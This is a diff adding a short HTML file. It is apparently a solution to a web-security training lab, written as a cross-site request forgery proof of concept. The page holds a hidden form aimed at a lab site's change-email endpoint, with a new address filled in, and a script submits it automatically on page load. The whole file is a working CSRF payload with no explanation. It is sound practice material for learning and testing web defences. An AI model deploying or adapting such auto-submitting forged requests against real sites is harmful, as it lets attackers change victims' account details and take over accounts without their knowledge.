@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="referrer" content="no-referrer" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <form method="POST" action="https://ac011f071e237cebc0fb9a8e00190067.web-security-academy.net/my-account/change-email" style="visibility: hidden;">
+        <input value="new-email@email.com" name="email" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
